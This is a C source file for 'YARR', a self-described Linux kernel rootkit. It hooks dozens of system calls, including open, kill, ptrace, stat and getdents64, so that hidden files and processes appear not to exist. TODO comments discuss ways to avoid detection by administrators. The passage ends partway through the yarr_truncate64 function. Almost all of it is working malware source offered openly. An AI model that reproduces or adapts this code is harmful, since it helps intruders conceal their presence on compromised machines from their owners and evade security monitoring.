/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/resource.h>
#include <linux/ioprio.h>
#include <linux/capability.h>
#include <linux/fs.h>
#include <linux/slab.h>

#include "syscallhooks.h"
#include "hook.h"
#include "debug.h"
#include "hideproc.h"
#include "hidefile.h"
#include "funcs.h"

// TODO: This is a fuck up. Each kernel flavour can has its own number of
// syscalls. The one where I'm working right now has 349, so there are 349
// NULL-initialized positions (minus the hooked syscalls). But what will
// happen with a kernel with a different amount of syscalls? Hu-ah! solve it
// yourself :).

// TODO: Imagine this situation, there is a task that is already inside a
// directory (for example /path/), then this directory is hidden, what
// happens?, what should happen?.

// TODO: When accessing a file inside a hidden directory instead of "no such
// file" message we are getting "is a directory" message. Debug and fix.

// TODO: Review all system calls to ensure if we implement all those that we
// need.
// List of missing syscalls:
//	- sys_getdents
//	- sys_fstat64

/*
 * Here we declare all the system calls that we will capture. This array has
 * as many positions as syscalls are in the kernel. Each position has NULL or
 * a function address. During yarr initialization if the position in this
 * table is non-null then the corresponding syscall is hooked.
 *
 * Whenever a new hook is developed you should substitute the corresponding
 * position with the address of your hook function. Take care, you will suffer
 * if you change a wrong NULL xDD.
 */

/*
void *syscalls_hooks[NR_syscalls] = {
	NULL, // 0
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_open,
	NULL,
	NULL,//yarr_waitpid, // Buggy, check commentaries.
	NULL,
	NULL,
	NULL, // 10
	NULL,//yarr_execve,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,	// TODO: Not really sure if this is sys_ni_syscall().
	NULL,
	NULL, // 20
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 25
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 35
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 45
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 50
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 55
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 60
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 65
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 70
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 75
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 80
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 90
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 95
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 100
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 105
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 110
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,//yarr_wait4,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 120
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 125
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 130
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 135
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 140
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 145
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 150
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 160
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 165
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 170
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 175
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 180
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 190
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,//yarr_stat64,
	yarr_lstat64,
	NULL,
	NULL,
	NULL,
	NULL, // 200
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 205
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 210
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 215
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,//yarr_getdents64,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 225
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 240
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 245
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 250
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 255
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 260
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 265
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 275
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 280
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 285
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 310
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 315
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 325
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 330
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 345
	NULL,
	NULL
};
*/

void *syscalls_hooks[NR_syscalls] = {
	NULL, // 0
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_open, // 5
	NULL,
	NULL,//yarr_waitpid, // Buggy, check commentaries.
	yarr_creat,
	yarr_link,
	yarr_unlink, // 10
	NULL,//yarr_execve,
	yarr_chdir,
	NULL,
	yarr_mknod,
	yarr_chmod, // 15
	yarr_lchown,
	NULL,
	NULL,	// TODO: Not really sure if this is sys_ni_syscall().
	NULL,
	NULL, // 20
	yarr_mount,
	yarr_umount,
	NULL,
	NULL,
	NULL, // 25
	yarr_ptrace,
	NULL,
	NULL,
	NULL,
	yarr_utime, // 30
	NULL,
	NULL,
	yarr_access,
	NULL,
	NULL, // 35
	NULL,
	yarr_kill,
	yarr_rename,
	yarr_mkdir,
	yarr_rmdir, // 40
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 45
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 50
	yarr_acct,
	NULL,
	NULL,
	NULL,
	NULL, // 55
	NULL,
	yarr_setpgid,
	NULL,
	NULL,
	NULL, // 60
	yarr_chroot,
	NULL,
	NULL,
	NULL,
	NULL, // 65
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 70
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 75
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 80
	NULL,
	NULL,
	yarr_symlink,
	NULL,
	yarr_readlink, // 85
	yarr_uselib,
	yarr_swapon,
	NULL,
	NULL,
	NULL, // 90
	NULL,
	yarr_truncate,
	NULL,
	NULL,
	NULL, // 95
	yarr_getpriority,
	yarr_setpriority,
	NULL,
	yarr_statfs,
	NULL, // 100
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 105
	yarr_stat,
	yarr_lstat,
	NULL,
	NULL,
	NULL, // 110
	NULL,
	NULL,
	NULL,
	NULL,//yarr_wait4,
	yarr_swapoff, // 115
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 120
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 125
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 130
	yarr_quotactl,
	yarr_getpgid,
	NULL,
	NULL,
	NULL, // 135
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 140
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 145
	NULL,
	yarr_getsid,
	NULL,
	NULL,
	NULL, // 150
	NULL,
	NULL,
	NULL,
	yarr_sched_setparam,
	yarr_sched_getparam, // 155
	yarr_sched_setscheduler,
	yarr_sched_getscheduler,
	NULL,
	NULL,
	NULL, // 160
	yarr_sched_rr_get_interval,
	NULL,
	NULL,
	NULL,
	NULL, // 165
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 170
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 175
	NULL,
	NULL,
	yarr_rt_sigqueueinfo,
	NULL,
	NULL, // 180
	NULL,
	yarr_chown,
	NULL,
	yarr_capget,
	yarr_capset, // 185
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 190
	NULL,
	NULL,
	yarr_truncate64,
	NULL,
	yarr_stat64, // 195
	yarr_lstat64,
	NULL,
	NULL,
	NULL,
	NULL, // 200
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 205
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 210
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 215
	NULL,
	yarr_pivot_root,
	NULL,
	NULL,
	yarr_getdents64, // 220
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 225
	yarr_setxattr,
	yarr_lsetxattr,
	NULL,
	yarr_getxattr,
	yarr_lgetxattr, // 230
	NULL,
	yarr_listxattr,
	yarr_llistxattr,
	NULL,
	yarr_removexattr, // 235
	yarr_lremovexattr,
	NULL,
	yarr_tkill,
	NULL,
	NULL, // 240
	yarr_sched_setaffinity,
	yarr_sched_getaffinity,
	NULL,
	NULL,
	NULL, // 245
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 250
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 255
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 260
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 265
	NULL,
	NULL,
	yarr_statfs64,
	NULL,
	yarr_tgkill, // 270
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 275
	NULL,
	yarr_mq_open,
	yarr_mq_unlink,
	NULL,
	NULL, // 280
	NULL,
	NULL,
	NULL,
	yarr_waitid,
	NULL, // 285
	NULL,
	NULL,
	NULL,
	yarr_ioprio_set,
	yarr_ioprio_get, // 290
	NULL,
	NULL,
	NULL,
	yarr_migrate_pages,
	yarr_openat, // 295
	yarr_mkdirat,
	yarr_mknodat,
	yarr_fchownat,
	yarr_futimesat,
	yarr_fstatat64, // 300
	yarr_unlinkat,
	yarr_renameat,
	yarr_linkat,
	yarr_symlinkat,
	yarr_readlinkat, // 305
	yarr_fchmodat,
	yarr_faccessat,
	NULL,
	NULL,
	NULL, // 310
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 315
	NULL,
	yarr_move_pages,
	NULL,
	NULL,
	yarr_utimensat, // 320
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 325
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 330
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_rt_tgsigqueueinfo, // 335
	yarr_perf_event_open,
	NULL,
	NULL,
	NULL,
	yarr_prlimit64, // 340
	yarr_name_to_handle_at,
	NULL,
	NULL,
	NULL,
	NULL, // 345
	NULL,
	yarr_process_vm_readv,
	yarr_process_vm_writev
};

/*
 * Here it comes the big part, the implementation of each syscall we want to
 * hook... almost every syscall :S.
 */

// TODO: I document this here but it applies to every file related syscall.
// Right now I will return -ENOENT if a hide file is trying to be accesed by
// someone with no permission to do that, but what would happen when someone
// tries to CREATE a file when it already exists and is hide? Yarr could be
// potentially detected this way if known files are hidden, i.e.: you decide
// to hide /etc/passwd and then the sysadmin tries to create it... Ok, it's
// really stupid hidding /etc/passwd, but think about the behaviour of yarr...
asmlinkage long yarr_open(const char __user *filename, int flags, int mode) {
	asmlinkage long (*sys_open)(const char __user *, int, int);
	int ret = -ENOENT;

//	// debug("yarr_open() called.\n");
	sys_open = sys_call_table_backup[__NR_open];

	if (!isFileHidden(filename))
		ret = sys_open(filename, flags, mode);
//	else
//		debug("Task %s tried to access file %s\n", current->comm, filename);

	return ret;
}

// TODO: Here we have an important bug. When rmmod is called the parent task
// (usually bash) call waitpid to wait for rmmod, so since sys_waitpid is
// hooked by yarr_waitpid it executes this code and stops here, then rmmod
// triggers all the logic of cleaning these hooks so yarr_waitpid is remove
// (that means, its code dissapears from kernel), then rmmod finish and its
// parent will awake and will try to keep executing the code at yarr_waitpid so
// it incurs into an oops kernel paging request. The good news is that this
// will only affect the parent of rmmod :), the rest of task will be fine...
// well that's not completely true, if there was another task executing
// yarr_waitpid it will incur in this bug too... right now I don't care :D.

// TODO: Check if the task is hidden.
/*asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options) {
	asmlinkage long (*sys_waitpid)(pid_t, int __user *, int);

	// debug("yarr_waitpid() called.\n");
	sys_waitpid = sys_call_table_backup[__NR_waitpid];
	return sys_waitpid(pid, stat_addr, options);
}*/

asmlinkage long yarr_creat(const char __user *filename, int mode) {
	asmlinkage long (*sys_creat)(const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_creat() called.\n");
	sys_creat = sys_call_table_backup[__NR_creat];

	if (!isFileHidden(filename))
		ret = sys_creat(filename, mode);

	return ret;
}

// TODO: What should we do when newname is already in use by a hide file?.
asmlinkage long yarr_link(const char __user *oldname,
						  const char __user *newname) {
	asmlinkage long (*sys_link)(const char __user *, const char __user *);
	int ret = -ENOENT;

	// debug("yarr_link() called.\n");
	sys_link = sys_call_table_backup[__NR_link];

	if (!isFileHidden(oldname) && !isFileHidden(newname))
		ret = sys_link(oldname, newname);

	return ret;
}

asmlinkage long yarr_unlink(const char __user *pathname) {
	asmlinkage long (*sys_unlink)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_unlink() called.\n");
	sys_unlink = sys_call_table_backup[__NR_unlink];

	if (!isFileHidden(pathname))
		ret = sys_unlink(pathname);

	return ret;
}

asmlinkage long yarr_chdir(const char __user *filename) {
	asmlinkage long (*sys_chdir)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_chdir() called.\n");
	sys_chdir = sys_call_table_backup[__NR_chdir];

	if (!isFileHidden(filename))
		ret = sys_chdir(filename);

	return ret;
}

// TODO: I think here is a bug, find it and remove it...
asmlinkage long yarr_execve(const char __user *filename,
							const char __user *const __user *argv,
							const char __user *const __user *envp,
							struct pt_regs *regs) {
	asmlinkage long (*sys_execve)(const char __user *,
								  const char __user *const __user *,
								  const char __user *const __user *,
								  struct pt_regs *regs);
	int ret = -ENOENT;

	// debug("yarr_execve() called.\n");
	sys_execve = sys_call_table_backup[__NR_execve];

	if (!isFileHidden(filename))
		ret = sys_execve(filename, argv, envp, regs);

	return ret;
}

asmlinkage long yarr_mknod(const char __user *filename, int mode,
						   unsigned dev) {
	asmlinkage long (*sys_mknod)(const char __user *, int, unsigned);
	int ret = -ENOMEM;

	// debug("yarr_mknod() called.\n");
	sys_mknod = sys_call_table_backup[__NR_mknod];

	if (!isFileHidden(filename))
		ret = sys_mknod(filename, mode, dev);

	return ret;
}

asmlinkage long yarr_chmod(const char __user *filename, mode_t mode) {
	asmlinkage long (*sys_chmod)(const char __user *, mode_t);
	int ret = -ENOENT;

	// debug("yarr_chmod() called.\n");
	sys_chmod = sys_call_table_backup[__NR_chmod];

	if (!isFileHidden(filename))
		ret = sys_chmod(filename, mode);

	return ret;
}

asmlinkage long yarr_lchown(const char __user *filename, uid_t user,
							gid_t group) {
	asmlinkage long (*sys_lchown)(const char __user *, uid_t, gid_t);
	int ret = -ENOENT;

	// debug("yarr_lchown() called.\n");
	sys_lchown = sys_call_table_backup[__NR_lchown];

	if (!isFileHidden(filename))
		ret = sys_lchown(filename, user, group);

	return ret;
}

asmlinkage long yarr_mount(char __user *dev_name, char __user *dir_name,
						   char __user *type, unsigned long flags,
						   void __user *data) {
	asmlinkage long (*sys_mount)(char __user *, char __user *, char __user *,
								 unsigned long, void __user *);
	int ret = -ENOMEM;

	// debug("yarr_mount() called.\n");
	sys_mount = sys_call_table_backup[__NR_mount];

	if (!isFileHidden(dir_name))
		ret = sys_mount(dev_name, dir_name, type, flags, data);

	return ret;
}

asmlinkage long yarr_umount(char __user *name, int flags) {
	asmlinkage long (*sys_umount)(char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_umount() called.\n");
	sys_umount = sys_call_table_backup[__NR_umount];

	if (!isFileHidden(name))
		ret = sys_umount(name, flags);

	return ret;
}

asmlinkage long yarr_ptrace(long request, long pid, unsigned long addr,
							unsigned long data) {
	asmlinkage long (*sys_ptrace)(long, long, unsigned long, unsigned long);
	int ret = -ESRCH;

	// debug("yarr_ptrace() called.\n");
	sys_ptrace = sys_call_table_backup[__NR_ptrace];

	if (!isProcHidden(pid))
		ret = sys_ptrace(request, pid, addr, data);

	return ret;
}

asmlinkage long yarr_utime(char __user *filename,
						   struct utimbuf __user *times) {
	asmlinkage long (*sys_utime)(char __user *, struct utimbuf __user *);
	int ret = -ENOENT;

	// debug("yarr_utime() called.\n");
	sys_utime = sys_call_table_backup[__NR_utime];

	if (!isFileHidden(filename))
		ret = sys_utime(filename, times);

	return ret;
}

asmlinkage long yarr_access(const char __user *filename, int mode) {
	asmlinkage long (*sys_access)(const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_access() called.\n");
	sys_access = sys_call_table_backup[__NR_access];

	if (!isFileHidden(filename))
		ret = sys_access(filename, mode);

	return ret;
}

asmlinkage long yarr_kill(int pid, int sig) {
	asmlinkage long (*sys_kill)(int, int);
	int ret = -ESRCH;

	// debug("yarr_kill() called.\n");
	sys_kill = sys_call_table_backup[__NR_kill];

	if (!isProcHidden(pid))
		ret = sys_kill(pid, sig);

	return ret;
}

// TODO: The case of oldname not hidden and newname is should be tested.
asmlinkage long yarr_rename(const char __user *oldname,
							const char __user *newname) {
	asmlinkage long (*sys_rename)(const char __user *, const char __user *);
	int ret = -ENOENT;

	// debug("yarr_rename() called.\n");
	sys_rename = sys_call_table_backup[__NR_rename];

	if (!isFileHidden(oldname) && !isFileHidden(newname))
		ret = sys_rename(oldname, newname);
	else if (isFileHidden(newname))
		ret = -ENOMEM;

	return ret;
}

asmlinkage long yarr_mkdir(const char __user *pathname, int mode) {
	asmlinkage long (*sys_mkdir)(const char __user *, int);
	int ret = -ENOMEM;

	// debug("yarr_mkdir() called.\n");
	sys_mkdir = sys_call_table_backup[__NR_mkdir];

	if (!isFileHidden(pathname))
		ret = sys_mkdir(pathname, mode);

	return ret;
}

asmlinkage long yarr_rmdir(const char __user *pathname) {
	asmlinkage long (*sys_rmdir)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_rmdir() called.\n");
	sys_rmdir = sys_call_table_backup[__NR_rmdir];

	if (!isFileHidden(pathname))
		ret = sys_rmdir(pathname);

	return ret;
}

// TODO: Information about the tasks is saved in this file... check if hidden
// tasks are revealed through this syscall.
asmlinkage long yarr_acct(const char __user *name) {
	asmlinkage long (*sys_acct)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_acct() called.\n");
	sys_acct = sys_call_table_backup[__NR_acct];

	if (!isFileHidden(name))
		ret = sys_acct(name);

	return ret;
}

asmlinkage long yarr_chroot(const char __user *filename) {
	asmlinkage long (*sys_chroot)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_chroot() called.\n");
	sys_chroot = sys_call_table_backup[__NR_chroot];

	if (!isFileHidden(filename))
		ret = sys_chroot(filename);

	return ret;
}

// TODO: Even if old doesn't exists the symbolic link is created (broken),
// this will provoke an error so yarr could be detected this way. This could
// be hard to fix, we need to create the symlink but don't show that it is
// pointing to an existing file. Also we should check link, linkat, symlinkat.
asmlinkage long yarr_symlink(const char __user *old, const char __user *new) {
	asmlinkage long (*sys_symlink)(const char __user *, const char __user *);
	int ret = -ENOENT;

	// debug("yarr_symlink() called.\n");
	sys_symlink = sys_call_table_backup[__NR_symlink];

	if (!isFileHidden(old) && !isFileHidden(new))
		ret = sys_symlink(old, new);
	else if (isFileHidden(new))
		ret = -ENOMEM;

	return ret;
}

asmlinkage long yarr_readlink(const char __user *path, char __user *buf,
							  int bufsiz) {
	asmlinkage long (*sys_readlink)(const char __user *, char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_readlink() called.\n");
	sys_readlink = sys_call_table_backup[__NR_readlink];

	if (!isFileHidden(path))
		ret = sys_readlink(path, buf, bufsiz);

	return ret;
}

asmlinkage long yarr_uselib(const char __user *library) {
	asmlinkage long (*sys_uselib)(const char __user *);
	int ret = -ENOENT;

	// debug("yarr_uselib() called.\n");
	sys_uselib = sys_call_table_backup[__NR_uselib];

	if (!isFileHidden(library))
		ret = sys_uselib(library);

	return ret;
}

asmlinkage long yarr_swapon(const char __user *specialfile, int swap_flags) {
	asmlinkage long (*sys_swapon)(const char __user *, int);
	int ret = -ENOENT;

	// debug("yarr_swapon() called.\n");
	sys_swapon = sys_call_table_backup[__NR_swapon];

	if (!isFileHidden(specialfile))
		ret = sys_swapon(specialfile, swap_flags);

	return ret;
}

asmlinkage long yarr_truncate(const char __user *path, long length) {
	asmlinkage long (*sys_truncate)(const char __user *, long);
	int ret = -ENOENT;

	// debug("yarr_truncate() called.\n");
	sys_truncate = sys_call_table_backup[__NR_truncate];

	if (!isFileHidden(path))
		ret = sys_truncate(path, length);

	return ret;
}

asmlinkage long yarr_setpgid(pid_t pid, pid_t pgid) {
	asmlinkage long (*sys_setpgid)(pid_t, pid_t);
	int ret = -ESRCH;

	// debug("yarr_setpgid() called.\n");
	sys_setpgid = sys_call_table_backup[__NR_setpgid];

	if (!isProcHidden(pid))
		ret = sys_setpgid(pid, pgid);

	return ret;
}

asmlinkage long yarr_getpriority(int which, int who) {
	asmlinkage long (*sys_getpriority)(int, int);
	int ret = -ESRCH;

	// debug("yarr_getpriority() called.\n");
	sys_getpriority = sys_call_table_backup[__NR_getpriority];

	if (which != PRIO_PROCESS || !isProcHidden(who))
		ret = sys_getpriority(which, who);

	return ret;
}

asmlinkage long yarr_setpriority(int which, int who, int niceval) {
	asmlinkage long (*sys_setpriority)(int, int, int);
	int ret = -ESRCH;

	// debug("yarr_setpriority() called.\n");
	sys_setpriority = sys_call_table_backup[__NR_setpriority];

	if (which != PRIO_PROCESS || !isProcHidden(who))
		ret = sys_setpriority(which, who, niceval);

	return ret;
}

asmlinkage long yarr_statfs(const char __user *path,
							struct statfs __user *buf) {
	asmlinkage long (*sys_statfs)(const char __user *, struct statfs __user *);
	int ret = -ENOENT;

	// debug("yarr_statfs() called.\n");
	sys_statfs = sys_call_table_backup[__NR_statfs];

	if (!isFileHidden(path))
		ret = sys_statfs(path, buf);

	return ret;
}

asmlinkage long yarr_stat(const char __user *filename,
						  struct __old_kernel_stat __user *statbuf) {
	asmlinkage long (*sys_stat)(const char __user *,
								struct __old_kernel_stat __user *);
	int ret = -ENOENT;

	// debug("yarr_stat() called.\n");
	sys_stat = sys_call_table_backup[__NR_stat];

	if (!isFileHidden(filename))
		ret = sys_stat(filename, statbuf);

	return ret;
}

asmlinkage long yarr_lstat(const char __user *filename,
						   struct __old_kernel_stat __user *statbuf) {
	asmlinkage long (*sys_lstat)(const char __user *,
								 struct __old_kernel_stat __user *);
	int ret = -ENOENT;

	// debug("yarr_lstat() called.\n");
	sys_lstat = sys_call_table_backup[__NR_lstat];

	if (!isFileHidden(filename))
		ret = sys_lstat(filename, statbuf);

	return ret;
}

// TODO: Not checked but I guess this is as buggy as yarr_waitpid :).
asmlinkage long yarr_wait4(pid_t pid, int __user *stat_addr, int options,
						   struct rusage __user *ru) {
	asmlinkage long (*sys_wait4)(pid_t, int __user *, int, struct rusage *);
	int ret = -ESRCH;

	// debug("yarr_wait4() called.\n");
	sys_wait4 = sys_call_table_backup[__NR_wait4];

	if (!isProcHidden(pid))
		ret = sys_wait4(pid, stat_addr, options, ru);

	return ret;
}

asmlinkage long yarr_swapoff(const char __user *specialfile) {
	asmlinkage long (*sys_swapoff)(const char __user *);
	int ret = -ESRCH;

	// debug("yarr_swapoff() called.\n");
	sys_swapoff = sys_call_table_backup[__NR_swapoff];

	if (!isFileHidden(specialfile))
		ret = sys_swapoff(specialfile);

	return ret;
}

// TODO: I'm still figuring out what is the first parameter to sys_init_module.
// Note this todo is not related to yarr_quotactl, yarr_init_module should be
// here, I mean in this space.

asmlinkage long yarr_quotactl(unsigned int cmd, const char __user *special,
							  qid_t qid, void __user *addr) {
	asmlinkage long (*sys_quotactl)(unsigned int, const char __user *, qid_t,
									void __user *);
	int ret = -EINVAL;

	// debug("yarr_quotactl() called.\n");
	sys_quotactl = sys_call_table_backup[__NR_quotactl];

	if (!isFileHidden(special))
		ret = sys_quotactl(cmd, special, qid, addr);

	return ret;
}

asmlinkage long yarr_getpgid(pid_t pid) {
	asmlinkage long (*sys_getpgid)(pid_t);
	int ret = -ESRCH;

	// debug("yarr_getpgid() called.\n");
	sys_getpgid = sys_call_table_backup[__NR_getpgid];

	if (!isProcHidden(pid))
		ret = sys_getpgid(pid);

	return ret;
}

asmlinkage long yarr_getsid(pid_t pid) {
	asmlinkage long (*sys_getsid)(pid_t);
	int ret = -ESRCH;

	// debug("yarr_getsid() called.\n");
	sys_getsid = sys_call_table_backup[__NR_getsid];

	if (!isProcHidden(pid))
		ret = sys_getsid(pid);

	return ret;
}

asmlinkage long yarr_sched_setparam(pid_t pid,
									struct sched_param __user *param) {
	asmlinkage long (*sys_sched_setparam)(pid_t, struct sched_param __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_setparam() called.\n");
	sys_sched_setparam = sys_call_table_backup[__NR_sched_setparam];

	if (!isProcHidden(pid))
		ret = sys_sched_setparam(pid, param);

	return ret;
}

asmlinkage long yarr_sched_getparam(pid_t pid,
									struct sched_param __user *param) {
	asmlinkage long (*sys_sched_getparam)(pid_t, struct sched_param __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_getparam() called.\n");
	sys_sched_getparam = sys_call_table_backup[__NR_sched_getparam];

	if (!isProcHidden(pid))
		ret = sys_sched_getparam(pid, param);

	return ret;
}

asmlinkage long yarr_sched_setscheduler(pid_t pid, int policy,
										struct sched_param __user *param) {
	asmlinkage long (*sys_sched_setscheduler)(pid_t, int,
											  struct sched_param __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_setscheduler() called.\n");
	sys_sched_setscheduler = sys_call_table_backup[__NR_sched_setscheduler];

	if (!isProcHidden(pid))
		ret = sys_sched_setscheduler(pid, policy, param);

	return ret;
}

asmlinkage long yarr_sched_getscheduler(pid_t pid) {
	asmlinkage long (*sys_sched_getscheduler)(pid_t);
	int ret = -ESRCH;

	// debug("yarr_sched_getscheduler() called.\n");
	sys_sched_getscheduler = sys_call_table_backup[__NR_sched_getscheduler];

	if (!isProcHidden(pid))
		ret = sys_sched_getscheduler(pid);

	return ret;
}

asmlinkage long yarr_sched_rr_get_interval(pid_t pid,
										   struct timespec __user *interval) {
	asmlinkage long (*sys_sched_rr_get_interval)(pid_t,
												 struct timespec __user *);
	int ret = -ESRCH;

	// debug("yarr_sched_rr_get_interval() called.\n");
	sys_sched_rr_get_interval = sys_call_table_backup[__NR_sched_rr_get_interval];

	if (!isProcHidden(pid))
		ret = sys_sched_rr_get_interval(pid, interval);

	return ret;
}

asmlinkage long yarr_rt_sigqueueinfo(int pid, int sig,
									 siginfo_t __user *uinfo) {
	asmlinkage long (*sys_rt_sigqueueinfo)(int, int, siginfo_t __user *);
	int ret = -ESRCH;

	// debug("yarr_rt_sigqueueinfo() called.\n");
	sys_rt_sigqueueinfo = sys_call_table_backup[__NR_rt_sigqueueinfo];

	if (!isProcHidden(pid))
		ret = sys_rt_sigqueueinfo(pid, sig, uinfo);

	return ret;
}

asmlinkage long yarr_chown(const char __user *filename, uid_t user,
						   gid_t group) {
	asmlinkage long (*sys_chown)(const char __user *, uid_t, gid_t);
	int ret = -ENOENT;

	// debug("yarr_chown() called.\n");
	sys_chown = sys_call_table_backup[__NR_chown];

	if (!isFileHidden(filename))
		ret = sys_chown(filename, user, group);

	return ret;
}

asmlinkage long yarr_capget(cap_user_header_t header,
							cap_user_data_t dataptr) {
	asmlinkage long (*sys_capget)(cap_user_header_t, cap_user_data_t);
	int ret = -EINVAL;

	// debug("yarr_capget() called.\n");
	sys_capget = sys_call_table_backup[__NR_capget];

	if (!isProcHidden(header->pid))
		ret = sys_capget(header, dataptr);

	return ret;
}

asmlinkage long yarr_capset(cap_user_header_t header,
							const cap_user_data_t data) {
	asmlinkage long (*sys_capset)(cap_user_header_t, const cap_user_data_t);
	int ret = -EINVAL;

	// debug("yarr_capset() called.\n");
	sys_capset = sys_call_table_backup[__NR_capset];

	if (!isProcHidden(header->pid))
		ret = sys_capset(header, data);

	return ret;
}

asmlinkage long yarr_truncate64(const char __user *path, loff_t length) {
	asmlinkage long (*sys_truncate64)(const char __user *, loff_t);
